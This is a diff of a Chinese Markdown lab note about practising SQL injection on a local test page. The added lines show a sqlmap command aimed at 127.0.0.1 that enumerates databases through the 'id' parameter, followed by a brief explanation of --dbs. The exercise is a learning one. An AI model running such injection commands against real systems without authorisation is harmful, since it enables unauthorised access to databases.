@@ -54,9 +54,17 @@ kali 自带 mysql，但后面还是打不开 1.php，试了好多办法还是不
 
  发现回显，存在注入点，可以进行三种类型的注入：
  ![输入图片说明](/imgs/2023-05-08/Y8AhkgXd7womGHty.png)
+
+使用
+```
+./sqlmap.py -u 'http://127.0.0.1/sql_injection/1.php?id=1&submit=submit' -p id --fresh-queries --dbs
+```
+*--dbs 获取数据库中的*
+
 > Written with [StackEdit中文版](https://stackedit.cn/).
+>
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE2ODI1OTQ2MjcsNzk2MjgzMTA4LDg4OT
+eyJoaXN0b3J5IjpbLTE5NzM1NTE1ODMsNzk2MjgzMTA4LDg4OT
 gzMjU5NCwxODAzNTAxNDg2LC02NzQ2NTQ5NTgsMTU4OTA0ODU4
 OSwtMTg1ODg2Mjk1NywtMTU2NjM1NDE3MCwyNzE5OTA2MzQsMj
 M5NzQ3MjI2LC0yMDY4Nzg4NTEyLDE2NDg1NTY2MTAsLTE4MDIz
